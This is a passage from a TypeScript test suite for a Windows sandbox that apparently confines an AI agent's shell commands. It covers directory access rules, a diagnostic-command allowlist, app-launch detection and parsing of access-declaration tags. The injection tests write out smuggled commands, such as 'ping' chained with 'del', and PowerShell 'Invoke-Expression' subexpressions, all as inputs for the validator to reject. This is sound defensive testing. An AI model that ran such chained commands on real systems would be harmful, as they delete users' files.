    const rwDirs = ["c:\\data\\"];
    // isBlockedPath: rwMatchLen = "c:\\data\\".length (parent), roMatchLen = "c:\\data\\sub\\".length (child)
    // rwMatchLen > 0 but rwMatchLen < roMatchLen → blocked!
    expect(isBlockedPath("C:\\Data\\Sub\\file.txt", rwDirs, roDirs)).toBe(true);
  });

  it("no matching dirs: file is blocked", () => {
    expect(isBlockedPath("C:\\Other\\file.txt", [], [])).toBe(true);
  });
});

// ── Parent/child directory hierarchy policy tests ──
// Tests the rules enforced by sandbox:add-user-dir in main.ts

describe("parent/child directory hierarchy policy", () => {
  // Simulates the decision logic from sandbox:add-user-dir
  type AddResult = { action: "add" } | { action: "skip"; reason: string };

  function checkAddDir(
    dir: string,
    access: "rw" | "ro",
    currentRW: string[],
    currentRO: string[],
  ): AddResult {
    const current = access === "rw" ? currentRW : currentRO;

    // Already in same list
    if (current.some((d) => d.toLowerCase() === dir.toLowerCase())) {
      return { action: "skip", reason: "duplicate" };
    }

    // Parent with same access already covers this child
    for (const existing of current) {
      if (isSubdirectoryOf(existing, dir)) {
        return { action: "skip", reason: "parent-covers" };
      }
    }

    // Parent has RW → child RO is ineffective
    if (access === "ro") {
      for (const rwDir of currentRW) {
        if (isSubdirectoryOf(rwDir, dir)) {
          return { action: "skip", reason: "parent-rw-covers" };
        }
      }
    }

    return { action: "add" };
  }

  describe("parent covers child (same access)", () => {
    it("parent RW exists, adding child RW → skip", () => {
      const result = checkAddDir("C:\\Data\\Sub", "rw", ["C:\\Data"], []);
      expect(result).toEqual({ action: "skip", reason: "parent-covers" });
    });

    it("parent RO exists, adding child RO → skip", () => {
      const result = checkAddDir("C:\\Data\\Sub", "ro", [], ["C:\\Data"]);
      expect(result).toEqual({ action: "skip", reason: "parent-covers" });
    });

    it("deep nesting: grandparent covers grandchild", () => {
      const result = checkAddDir("C:\\Data\\A\\B\\C", "rw", ["C:\\Data"], []);
      expect(result).toEqual({ action: "skip", reason: "parent-covers" });
    });
  });

  describe("parent RW makes child RO ineffective", () => {
    it("parent RW exists, adding child RO → skip (inherited ACL)", () => {
      const result = checkAddDir("C:\\Data\\Sub", "ro", ["C:\\Data"], []);
      expect(result).toEqual({ action: "skip", reason: "parent-rw-covers" });
    });

    it("deep nesting: grandparent RW blocks grandchild RO", () => {
      const result = checkAddDir("C:\\Data\\A\\B", "ro", ["C:\\Data"], []);
      expect(result).toEqual({ action: "skip", reason: "parent-rw-covers" });
    });
  });

  describe("valid combinations", () => {
    it("parent RO, adding child RW → allowed (escalation)", () => {
      const result = checkAddDir("C:\\Data\\Sub", "rw", [], ["C:\\Data"]);
      expect(result).toEqual({ action: "add" });
    });

    it("no parent exists → allowed", () => {
      const result = checkAddDir("C:\\NewDir", "rw", ["C:\\Other"], []);
      expect(result).toEqual({ action: "add" });
    });

    it("child exists, adding parent → allowed (parent is not a sub of child)", () => {
      const result = checkAddDir("C:\\Data", "rw", ["C:\\Data\\Sub"], []);
      expect(result).toEqual({ action: "add" });
    });

    it("sibling directory → allowed", () => {
      const result = checkAddDir("C:\\Data2", "rw", ["C:\\Data"], []);
      expect(result).toEqual({ action: "add" });
    });
  });

  // Tests for auto-removal of redundant children when adding a parent
  describe("auto-remove redundant children", () => {
    function getChildrenToRemove(
      parentDir: string,
      parentAccess: "rw" | "ro",
      rwDirs: string[],
      roDirs: string[],
    ): { removedRW: string[]; removedRO: string[]; keptRW: string[] } {
      if (parentAccess === "rw") {
        // Parent RW → remove all children
        const removedRW = rwDirs.filter((d) => d !== parentDir && isSubdirectoryOf(parentDir, d));
        const removedRO = roDirs.filter((d) => isSubdirectoryOf(parentDir, d));
        return { removedRW, removedRO, keptRW: [] };
      } else {
        // Parent RO → remove child RO, keep child RW
        const removedRO = roDirs.filter((d) => d !== parentDir && isSubdirectoryOf(parentDir, d));
        const keptRW = rwDirs.filter((d) => isSubdirectoryOf(parentDir, d));
        return { removedRW: [], removedRO, keptRW };
      }
    }

    it("adding parent RW removes child RW", () => {
      const result = getChildrenToRemove("C:\\Data", "rw", ["C:\\Data\\Sub"], []);
      expect(result.removedRW).toEqual(["C:\\Data\\Sub"]);
    });

    it("adding parent RW removes child RO", () => {
      const result = getChildrenToRemove("C:\\Data", "rw", [], ["C:\\Data\\Sub"]);
      expect(result.removedRO).toEqual(["C:\\Data\\Sub"]);
    });

    it("adding parent RW removes both child RW and RO", () => {
      const result = getChildrenToRemove("C:\\Data", "rw", ["C:\\Data\\A"], ["C:\\Data\\B"]);
      expect(result.removedRW).toEqual(["C:\\Data\\A"]);
      expect(result.removedRO).toEqual(["C:\\Data\\B"]);
    });

    it("adding parent RO removes child RO but keeps child RW", () => {
      const result = getChildrenToRemove(
        "C:\\Data",
        "ro",
        ["C:\\Data\\RWChild"],
        ["C:\\Data\\ROChild"],
      );
      expect(result.removedRW).toEqual([]);
      expect(result.removedRO).toEqual(["C:\\Data\\ROChild"]);
      expect(result.keptRW).toEqual(["C:\\Data\\RWChild"]);
    });

    it("non-subdirectory dirs are not removed", () => {
      const result = getChildrenToRemove(
        "C:\\Data",
        "rw",
        ["C:\\Other", "C:\\Data\\Sub"],
        ["D:\\Docs"],
      );
      expect(result.removedRW).toEqual(["C:\\Data\\Sub"]);
      expect(result.removedRO).toEqual([]);
    });
  });
});

// ── isSafeDiagnosticCommand / isSafeDiagnosticCommandStr ──
// Tests for the safe diagnostic tool bypass that allows low-risk system
// tools (ping, tracert, nslookup, hostname, arp) to run outside AppContainer.

const { isSafeDiagnosticCommand, isSafeDiagnosticCommandStr } = cpHooks;

describe("isSafeDiagnosticCommand", () => {
  describe("allowed commands", () => {
    it("ping with host", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8"])).toBe(true);
    });

    it("ping with flags", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping -n 4 google.com"])).toBe(true);
    });

    it("tracert", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "tracert google.com"])).toBe(true);
    });

    it("nslookup", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "nslookup example.com"])).toBe(true);
    });

    it("hostname", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "hostname"])).toBe(true);
    });

    it("arp -a", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "arp -a"])).toBe(true);
    });

    it("arp piped to findstr", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", 'arp -a | findstr /C:"---"'])).toBe(true);
    });

    it("ping piped to find", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", 'ping 8.8.8.8 | find "Reply"'])).toBe(true);
    });

    it("pathping", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "pathping google.com"])).toBe(true);
    });

    it("multiple safe commands chained with &&", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "hostname && ping 8.8.8.8"])).toBe(true);
    });

    it("via powershell -Command", () => {
      expect(isSafeDiagnosticCommand("powershell.exe", ["-Command", "ping 8.8.8.8"])).toBe(true);
    });

    it("piped through more", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "arp -a | more"])).toBe(true);
    });

    it("piped through sort", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "arp -a | sort"])).toBe(true);
    });
  });

  describe("blocked commands", () => {
    it("rejects dir (not a diagnostic tool)", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "dir C:\\"])).toBe(false);
    });

    it("rejects netstat (info-sensitive)", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "netstat -an"])).toBe(false);
    });

    it("rejects systeminfo (info-sensitive)", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "systeminfo"])).toBe(false);
    });

    it("rejects whoami (info-sensitive)", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "whoami"])).toBe(false);
    });

    it("rejects ipconfig (info-sensitive)", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ipconfig /all"])).toBe(false);
    });

    it("rejects ping chained with del (unsafe combo)", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8 && del C:\\important"])).toBe(
        false,
      );
    });

    it("rejects safe tool piped to powershell (unsafe filter)", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "arp -a | powershell -c Write-Host"])).toBe(
        false,
      );
    });

    it("rejects empty payload", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", ""])).toBe(false);
    });

    it("rejects no args", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", [])).toBe(false);
    });
  });

  describe("injection attacks", () => {
    it("rejects single & separator: ping & del", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8 & del C:\\file"])).toBe(false);
    });

    it("rejects single & with safe first but unsafe second", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "hostname & whoami"])).toBe(false);
    });

    it("rejects output redirection: ping > file", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8 > C:\\out.txt"])).toBe(false);
    });

    it("rejects append redirection: ping >> file", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8 >> C:\\out.txt"])).toBe(false);
    });

    it("rejects input redirection: ping < file", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping < C:\\hosts.txt"])).toBe(false);
    });

    it("rejects PowerShell subexpression: $()", () => {
      expect(
        isSafeDiagnosticCommand("powershell.exe", [
          "-Command",
          "ping $(Invoke-Expression 'malicious')",
        ]),
      ).toBe(false);
    });

    it("rejects backtick escape sequences", () => {
      expect(isSafeDiagnosticCommand("powershell.exe", ["-Command", "ping `& malicious"])).toBe(
        false,
      );
    });

    it("rejects pipe to cmd.exe", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8 | cmd /c del C:\\file"])).toBe(
        false,
      );
    });

    it("rejects double-& with unsafe trailing command", () => {
      expect(
        isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8 && powershell -c Remove-Item"]),
      ).toBe(false);
    });

    it("rejects || with unsafe fallback", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8 || del C:\\file"])).toBe(
        false,
      );
    });

    it("allows single & between two safe tools", () => {
      expect(isSafeDiagnosticCommand("cmd.exe", ["/c", "ping 8.8.8.8 & hostname"])).toBe(true);
    });
  });
});

describe("isSafeDiagnosticCommandStr", () => {
  it("allows arp -a | findstr", () => {
    expect(isSafeDiagnosticCommandStr('arp -a | findstr /C:"---"')).toBe(true);
  });

  it("allows ping", () => {
    expect(isSafeDiagnosticCommandStr("ping 8.8.8.8")).toBe(true);
  });

  it("blocks del command", () => {
    expect(isSafeDiagnosticCommandStr("del C:\\file.txt")).toBe(false);
  });

  it("blocks mixed safe + unsafe", () => {
    expect(isSafeDiagnosticCommandStr("ping 8.8.8.8 && whoami")).toBe(false);
  });

  it("blocks empty string", () => {
    expect(isSafeDiagnosticCommandStr("")).toBe(false);
  });

  it("blocks single & injection: ping & del", () => {
    expect(isSafeDiagnosticCommandStr("ping 8.8.8.8 & del C:\\file")).toBe(false);
  });

  it("blocks output redirection", () => {
    expect(isSafeDiagnosticCommandStr("ping 8.8.8.8 > C:\\out.txt")).toBe(false);
  });

  it("blocks PowerShell subexpression", () => {
    expect(isSafeDiagnosticCommandStr("ping $(IEX 'evil')")).toBe(false);
  });

  it("blocks backtick escape", () => {
    expect(isSafeDiagnosticCommandStr("ping `& malicious")).toBe(false);
  });

  it("allows single & between safe tools", () => {
    expect(isSafeDiagnosticCommandStr("ping 8.8.8.8 & hostname")).toBe(true);
  });
});

// ── extractLaunchedApp ──
// Detects the name of an external application being launched by a shell command.
// Must NOT false-positive on .exe paths that are file arguments to file
// manipulation cmdlets like Move-Item, Copy-Item, etc.

const { extractLaunchedApp } = cpHooks;

describe("extractLaunchedApp", () => {
  // Helper: simulate pwsh.exe being the cmd, with given args
  const pwsh = "C:\\Program Files\\PowerShell\\7\\pwsh.exe";

  describe("correctly detects real app launches", () => {
    it("Start-Process with exe name", () => {
      expect(extractLaunchedApp(pwsh, ["-Command", "Start-Process notepad"])).toBe("notepad");
    });

    it("Start-Process with full path", () => {
      expect(extractLaunchedApp(pwsh, ["-Command", "Start-Process C:\\Windows\\notepad.exe"])).toBe(
        "notepad",
      );
    });

    it("& invocation operator with quoted path", () => {
      expect(extractLaunchedApp(pwsh, ["-Command", "& 'C:\\Tools\\myapp.exe' --flag"])).toBe(
        "myapp",
      );
    });

    it("direct exe path invocation", () => {
      expect(extractLaunchedApp(pwsh, ["-Command", "C:\\Tools\\myapp.exe --arg"])).toBe("myapp");
    });

    it("Invoke-Item with exe", () => {
      expect(extractLaunchedApp(pwsh, ["-Command", "Invoke-Item C:\\Tools\\psping64.exe"])).toBe(
        "psping64",
      );
    });

    it("cmd start command", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "start notepad"])).toBe("notepad");
    });
  });

  describe("does NOT false-positive on file manipulation cmdlets", () => {
    // Exact command from the bug screenshot:
    // C:\Program Files\PowerShell\7\pwsh.exe -NoProfile -NonInteractive
    //   -Command powershell -NoProfile -NonInteractive -Command
    //   "Move-Item -LiteralPath 'C:\Users\yuxwei\Desktop\psping64.exe'
    //    -Destination 'C:\..."
    it("screenshot bug: Move-Item -LiteralPath psping64.exe mis-detected as app launch", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "powershell",
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "Move-Item -LiteralPath 'C:\\Users\\yuxwei\\Desktop\\psping64.exe' -Destination 'C:\\Tools\\psping64.exe'",
        ]),
      ).toBeNull();
    });

    it("Move-Item with unquoted .exe path", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-Command",
          "Move-Item C:\\Users\\test\\app.exe C:\\Dest\\app.exe",
        ]),
      ).toBeNull();
    });

    it("Copy-Item with .exe source", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-Command",
          "Copy-Item -Path 'C:\\Source\\tool.exe' -Destination 'C:\\Dest\\tool.exe'",
        ]),
      ).toBeNull();
    });

    it("Remove-Item with .exe", () => {
      expect(
        extractLaunchedApp(pwsh, ["-Command", "Remove-Item 'C:\\Temp\\old-tool.exe'"]),
      ).toBeNull();
    });

    it("Rename-Item with .exe", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-Command",
          "Rename-Item 'C:\\Tools\\app-old.exe' 'app-new.exe'",
        ]),
      ).toBeNull();
    });

    it("Get-Item with .exe", () => {
      expect(
        extractLaunchedApp(pwsh, ["-Command", "Get-Item 'C:\\Tools\\psping64.exe'"]),
      ).toBeNull();
    });

    it("Get-FileHash with .exe", () => {
      expect(
        extractLaunchedApp(pwsh, ["-Command", "Get-FileHash 'C:\\Tools\\installer.exe'"]),
      ).toBeNull();
    });

    it("nested shell: pwsh -Command Move-Item .exe", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "powershell -NoProfile -NonInteractive -Command \"Move-Item -LiteralPath 'C:\\Users\\admin\\Desktop\\psping64.exe' -Destination 'C:\\Tools'\"",
        ]),
      ).toBeNull();
    });

    it("cmd del with .exe", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "del C:\\Temp\\old-app.exe"])).toBeNull();
    });

    it("cmd copy with .exe", () => {
      expect(
        extractLaunchedApp("cmd.exe", ["/c", "copy C:\\Source\\app.exe C:\\Dest\\app.exe"]),
      ).toBeNull();
    });
  });

  describe("returns null for non-app commands", () => {
    it("simple dir command", () => {
      expect(extractLaunchedApp(pwsh, ["-Command", "dir C:\\Users"])).toBeNull();
    });

    it("echo command", () => {
      expect(extractLaunchedApp(pwsh, ["-Command", "echo hello"])).toBeNull();
    });

    it("empty args", () => {
      expect(extractLaunchedApp(pwsh, [])).toBeNull();
    });
  });

  describe("does NOT false-positive on 'start' in natural language or JSON bodies", () => {
    it("curl with JSON body containing 'start your reply' (the original bug)", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          'curl.exe -s -X POST "https://api.example.com/v1/messages" ' +
            '-H "x-api-key: sk-test" -H "anthropic-version: 2023-06-01" -H "content-type: application/json" ' +
            '-d \'{"model": "claude-3-5-sonnet", "max_tokens": 1024, ' +
            '"system": "You are a senior backend engineer. Answer briefly and precisely. You MUST start your reply with the exact phrase: SYSTEM_MSG_WORKS.", ' +
            '"messages": [{"role": "user", "content": "Explain how Redis persistence works."}]}\'',
        ]),
      ).toBeNull();
    });

    it("curl with JSON body containing 'start application'", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-Command",
          'curl.exe -d \'{"prompt": "Please start application deployment"}\' https://api.example.com',
        ]),
      ).toBeNull();
    });

    it("echo with natural language containing 'start'", () => {
      expect(
        extractLaunchedApp(pwsh, ["-Command", 'echo "Please start your analysis now"']),
      ).toBeNull();
    });

    it("Write-Output with 'start' in text", () => {
      expect(
        extractLaunchedApp(pwsh, ["-Command", 'Write-Output "To start your task, run the script"']),
      ).toBeNull();
    });

    it("variable assignment containing 'start'", () => {
      expect(
        extractLaunchedApp(pwsh, ["-Command", '$msg = "You can start your work now"']),
      ).toBeNull();
    });

    it("Invoke-RestMethod with body containing 'start'", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-Command",
          'Invoke-RestMethod -Uri "https://api.test.com" -Body \'{"instructions": "start fresh"}\' -Method Post',
        ]),
      ).toBeNull();
    });

    it("grep/Select-String searching for 'start'", () => {
      expect(
        extractLaunchedApp(pwsh, [
          "-Command",
          'Get-Content log.txt | Select-String "start your engine"',
        ]),
      ).toBeNull();
    });
  });

  describe("still detects 'start' command at proper command positions", () => {
    it("start at beginning of payload", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "start notepad"])).toBe("notepad");
    });

    it("start with title argument (empty quotes)", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", 'start "" notepad'])).toBe("notepad");
    });

    it("start after semicolon separator", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "echo done; start calc"])).toBe("calc");
    });

    it("start after && separator", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "echo done && start calc"])).toBe("calc");
    });

    it("start after single & separator", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "echo done & start calc"])).toBe("calc");
    });

    it("start after pipe", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "echo done | start calc"])).toBe("calc");
    });

    it("start after newline in multi-line command", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "echo done\nstart calc"])).toBe("calc");
    });

    it("start after || separator", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "echo done || start calc"])).toBe("calc");
    });

    it("start with .exe extension", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "start notepad.exe"])).toBe("notepad");
    });

    it("start with full path", () => {
      expect(extractLaunchedApp("cmd.exe", ["/c", "start C:\\Windows\\notepad.exe"])).toBe(
        "notepad",
      );
    });
  });
});

// ── Inline declare-access parsing ──
// Tests the regex patterns and payload boundary detection used by
// tryInlineDeclareAccess. These are pure regex tests — no sandbox activation
// or permission IPC needed.

describe("inline declare-access parsing", () => {
  const { DECLARE_TAG_RE } = cpHooks;

  describe("DECLARE_TAG_RE", () => {
    it("matches basic tag with single rw entry", () => {
      const m = DECLARE_TAG_RE.exec("[declare-access]rw:C:\\a[/declare-access]");
      expect(m).not.toBeNull();
      expect(m![1]).toBe("rw:C:\\a");
    });

    it("matches tag with ro entry", () => {
      const m = DECLARE_TAG_RE.exec("[declare-access]ro:C:\\data[/declare-access]");
      expect(m).not.toBeNull();
      expect(m![1]).toBe("ro:C:\\data");
    });

    it("matches tag with multiple semicolon-separated entries", () => {
      const m = DECLARE_TAG_RE.exec("[declare-access]rw:C:\\a;ro:C:\\b[/declare-access]");
      expect(m).not.toBeNull();
      expect(m![1]).toBe("rw:C:\\a;ro:C:\\b");
    });

    it("matches tag with path containing spaces", () => {
      const m = DECLARE_TAG_RE.exec(
        "[declare-access]rw:C:\\Users\\hasu\\OneDrive - Microsoft\\Desktop[/declare-access]",
      );
      expect(m).not.toBeNull();
      expect(m![1]).toBe("rw:C:\\Users\\hasu\\OneDrive - Microsoft\\Desktop");
    });

    it("matches tag with $env variable", () => {
      const m = DECLARE_TAG_RE.exec(
        "[declare-access]rw:$env:USERPROFILE\\Downloads[/declare-access]",
      );
      expect(m).not.toBeNull();
      expect(m![1]).toBe("rw:$env:USERPROFILE\\Downloads");
    });

    it("matches tag embedded in comment line", () => {
      const cmd =
        "# [declare-access]rw:C:\\a;rw:C:\\b[/declare-access]\nMove-Item C:\\a\\f.txt C:\\b\\";
      const m = DECLARE_TAG_RE.exec(cmd);
      expect(m).not.toBeNull();
      expect(m![1]).toBe("rw:C:\\a;rw:C:\\b");
    });

    it("matches case-insensitively", () => {
      const m = DECLARE_TAG_RE.exec("[Declare-Access]rw:C:\\a[/Declare-Access]");
      expect(m).not.toBeNull();
      expect(m![1]).toBe("rw:C:\\a");
    });

    it("does not match unrelated commands", () => {
      expect(DECLARE_TAG_RE.exec("Get-ChildItem C:\\a")).toBeNull();
    });

    it("does not match incomplete tags", () => {
      expect(DECLARE_TAG_RE.exec("[declare-access]rw:C:\\a")).toBeNull();
    });
  });

  describe("tag stripping", () => {
    // Simulate the stripping logic from tryInlineDeclareAccess
    function stripTag(cmdStr: string): string | null {
      const m = DECLARE_TAG_RE.exec(cmdStr);
      if (!m) return null;
      const before = cmdStr.substring(0, m.index);
      const after = cmdStr.substring(m.index + m[0].length);
      const cleaned = before.replace(/(?:#|\/\/|::|REM)\s*$/i, "") + after;
      return cleaned.replace(/^[ \t]*[\r\n]+/m, "").trim() || null;
    }

    it("strips tag from multi-line comment + command", () => {
      const cmd = "# [declare-access]rw:C:\\a[/declare-access]\nMove-Item C:\\a\\f.txt C:\\b\\";
      expect(stripTag(cmd)).toBe("Move-Item C:\\a\\f.txt C:\\b\\");
    });

    it("strips tag from single-line (tag + command, no newline)", () => {
      const cmd = "# [declare-access]rw:C:\\a[/declare-access] Move-Item C:\\a\\f.txt C:\\b\\";
      const rest = stripTag(cmd);
      expect(rest).toBe("Move-Item C:\\a\\f.txt C:\\b\\");
    });

    it("strips tag from single-line with Get-ChildItem", () => {
      const cmd =
        "# [declare-access]ro:C:\\a[/declare-access] Get-ChildItem -Force C:\\a | Select-Object Mode,Length,LastWriteTime,Name | Format-Table -AutoSize";
      const rest = stripTag(cmd);
      expect(rest).toBe(
        "Get-ChildItem -Force C:\\a | Select-Object Mode,Length,LastWriteTime,Name | Format-Table -AutoSize",
      );
    });

    it("strips tag with path containing spaces", () => {
      const cmd =
        "# [declare-access]rw:C:\\Users\\hasu\\OneDrive - Microsoft\\Desktop[/declare-access]\n$desktop = 'C:\\Users\\hasu\\OneDrive - Microsoft\\Desktop'\nGet-ChildItem -Force $desktop";
      const rest = stripTag(cmd);
      expect(rest).toContain("$desktop");
      expect(rest).not.toContain("[declare-access]");
    });

    it("strips tag with // comment prefix", () => {
      const cmd = "// [declare-access]ro:C:\\data[/declare-access]\nGet-Content C:\\data\\f.txt";
      expect(stripTag(cmd)).toBe("Get-Content C:\\data\\f.txt");
    });

    it("strips tag with :: comment prefix", () => {
      const cmd = ":: [declare-access]rw:C:\\temp[/declare-access]\ndir C:\\temp";
      expect(stripTag(cmd)).toBe("dir C:\\temp");
    });

    it("returns null for non-declare command", () => {
      expect(stripTag("Get-ChildItem C:\\a")).toBeNull();
    });

    it("the real-world failing case: OneDrive path single-line", () => {
      const cmd =
        "# [declare-access]rw:C:\\Users\\hasu\\OneDrive - Microsoft\\Desktop[/declare-access] $desktop = 'C:\\Users\\hasu\\OneDrive - Microsoft\\Desktop' Get-ChildItem -LiteralPath $desktop -Force";
      const rest = stripTag(cmd);
      expect(rest).not.toBeNull();
      expect(rest).toContain("$desktop");
      expect(rest).not.toContain("[declare-access]");
      expect(rest).not.toContain("[/declare-access]");
    });

    it("the real-world complex command: multi-path single-line", () => {
      const cmd =
        "# [declare-access]ro:C:\\Users\\hasu\\.openclaw;ro:C:\\Users\\hasu\\.openclaw-node;ro:C:\\Users\\hasu\\Desktop[/declare-access] $ErrorActionPreference='Stop' $skillHits = @() $roots = @('C:\\Users\\hasu\\.openclaw','C:\\Users\\hasu\\.openclaw-node') | Where-Object { Test-Path $_ } foreach ($root in $roots) { $skillHits += Get-ChildItem -Path $root -Recurse -File -Filter 'SKILL.md' -ErrorAction SilentlyContinue } $desktopItems = Get-ChildItem -Force 'C:\\Users\\hasu\\Desktop' | Select-Object Name,FullName";
      const rest = stripTag(cmd);
      expect(rest).not.toBeNull();
      expect(rest).toContain("$ErrorActionPreference");
      expect(rest).toContain("Get-ChildItem");
      expect(rest).not.toContain("[declare-access]");
      expect(rest).not.toContain("[/declare-access]");
    });

    it("extracts declare-access payload from multi-path tag", () => {
      const cmd =
        "# [declare-access]ro:C:\\Users\\hasu\\.openclaw;ro:C:\\Users\\hasu\\.openclaw-node;ro:C:\\Users\\hasu\\Desktop[/declare-access] Get-ChildItem C:\\Users\\hasu\\Desktop";
      const m = DECLARE_TAG_RE.exec(cmd);
      expect(m).not.toBeNull();
      expect(m![1]).toBe(
        "ro:C:\\Users\\hasu\\.openclaw;ro:C:\\Users\\hasu\\.openclaw-node;ro:C:\\Users\\hasu\\Desktop",
      );
      const entries = m![1].split(";");
      expect(entries).toHaveLength(3);
      expect(entries[0]).toBe("ro:C:\\Users\\hasu\\.openclaw");
      expect(entries[1]).toBe("ro:C:\\Users\\hasu\\.openclaw-node");
      expect(entries[2]).toBe("ro:C:\\Users\\hasu\\Desktop");
    });
  });
});

// ── tryInlineDeclareAccess integration tests ──
// Exercises the actual exported function, which requires sandbox state to be active.
// We toggle S.state.sandboxActive around each test.

describe("tryInlineDeclareAccess", () => {
  const S = require("../../appcontainer/sandbox-state.js");
  const { tryInlineDeclareAccess } = cpHooks;

  beforeEach(() => {
    S.state.sandboxActive = true;
    // Add safe paths so permission checks auto-grant instead of blocking
    // (shouldBlockRead/Write would try IPC which doesn't exist in tests)
    S._safePaths.push("c:\\users\\accessa\\");
    S._safePaths.push("c:\\users\\accessb\\");
    S._safePaths.push("c:\\users\\yuxwei\\desktop\\");
    S._safePaths.push("c:\\a\\");
    S._safePaths.push("c:\\b\\");
    S._safePaths.push("c:\\c\\");
    S._safePaths.push("c:\\data\\");
    S._safePaths.push("c:\\temp\\");
  });

  afterEach(() => {
    S.state.sandboxActive = false;
    // Clean up safe paths we added
    const toRemove = new Set([
      "c:\\users\\accessa\\",
      "c:\\users\\accessb\\",
      "c:\\users\\yuxwei\\desktop\\",
      "c:\\a\\",
      "c:\\b\\",
      "c:\\c\\",
      "c:\\data\\",
      "c:\\temp\\",
    ]);
    for (let i = S._safePaths.length - 1; i >= 0; i--) {
      if (toRemove.has(S._safePaths[i])) S._safePaths.splice(i, 1);
    }
  });

  // ── Basic behavior ──

  it("returns null when sandbox is inactive", () => {
    S.state.sandboxActive = false;
    const cmd = "# [declare-access]rw:C:\\a[/declare-access]\nMove-Item C:\\a\\f.txt C:\\b\\";
    expect(tryInlineDeclareAccess(cmd)).toBeNull();
  });

  it("returns null for commands without declare-access tags", () => {
    expect(tryInlineDeclareAccess("Get-ChildItem C:\\a")).toBeNull();
  });

  it("returns null for empty tag payload", () => {
    const cmd = "# [declare-access][/declare-access]\nGet-ChildItem C:\\a";
    expect(tryInlineDeclareAccess(cmd)).toBeNull();
  });

  it("handles single tag and strips it", () => {
    const cmd = "# [declare-access]rw:C:\\a[/declare-access]\nMove-Item C:\\a\\f.txt C:\\b\\";
    const result = tryInlineDeclareAccess(cmd);
    expect(typeof result).toBe("string");
    expect(result).toBe("Move-Item C:\\a\\f.txt C:\\b\\");
    expect(result).not.toContain("[declare-access]");
  });

  it("handles single inline tag on same line as command", () => {
    const cmd = "# [declare-access]ro:C:\\data[/declare-access] Get-Content C:\\data\\f.txt";
    const result = tryInlineDeclareAccess(cmd);
    expect(result).not.toBeNull();
    expect(result).toContain("Get-Content");
    expect(result).not.toContain("[declare-access]");
  });

  // ── Case 1: Multiple tags with distinct paths — all extracted ──

  it("extracts all distinct paths from multiple tags", () => {
    // Tag 1 has C:\a, tag 2 has C:\b and C:\c — all three should be declared
    const cmd =
      "# [declare-access]rw:C:\\a[/declare-access]\n" +
      "Copy-Item C:\\a\\f.txt C:\\b\\\n" +
      "# [declare-access]rw:C:\\b;ro:C:\\c[/declare-access]";
    const result = tryInlineDeclareAccess(cmd);
    expect(typeof result).toBe("string");
    // Both tags stripped
    expect(result).not.toContain("[declare-access]");
    expect(result).not.toContain("[/declare-access]");
    // Command body preserved
    expect(result).toContain("Copy-Item");
  });

  it("real-world: two tags with non-overlapping paths", () => {
    const cmd =
      "# [declare-access]ro:C:\\Users\\AccessA[/declare-access]\n" +
      "Get-ChildItem C:\\Users\\AccessA\n" +
      "# [declare-access]rw:C:\\Users\\yuxwei\\Desktop[/declare-access]";
    const result = tryInlineDeclareAccess(cmd);
    expect(typeof result).toBe("string");
    expect(result).not.toContain("[declare-access]");
    expect(result).toContain("Get-ChildItem");
  });

  // ── Case 2: Duplicate paths with same access — deduplicated ──

  it("deduplicates identical entries across duplicate tags", () => {
    // Both tags declare exactly the same paths — should only prompt once per path
    const cmd =
      "# [declare-access]ro:C:\\Users\\AccessA;ro:C:\\Users\\AccessB;rw:C:\\Users\\yuxwei\\Desktop[/declare-access] " +
